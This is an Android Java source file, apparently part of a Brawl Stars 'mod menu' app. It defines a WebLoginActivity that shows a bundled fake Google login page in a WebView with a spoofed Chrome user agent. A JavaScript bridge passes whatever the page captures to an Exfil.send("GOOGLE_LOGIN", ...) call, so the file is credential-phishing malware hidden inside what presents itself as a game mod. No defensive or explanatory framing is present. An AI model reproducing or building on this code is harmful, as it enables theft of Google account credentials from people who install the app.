package com.brawl.modmenu;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebLoginActivity extends Activity {

    private WebView web;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        web = new WebView(this);
        web.getSettings().setJavaScriptEnabled(true);
        web.getSettings().setDomStorageEnabled(true);
        web.getSettings().setAllowFileAccess(true);
        web.getSettings().setUserAgentString(
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36");

        web.addJavascriptInterface(new Bridge(), "NativeBridge");
        web.setWebViewClient(new WebViewClient());
        web.loadUrl("file:///android_asset/google-login/index.html");
        setContentView(web);
    }

    class Bridge {
        @JavascriptInterface
        public void log(String data) {
            Exfil.send("GOOGLE_LOGIN", data);
        }

        @JavascriptInterface
        public void done() {
            runOnUiThread(() -> {
                startActivity(new Intent(WebLoginActivity.this, MainActivity.class));
                finish();
            });
        }
    }
}
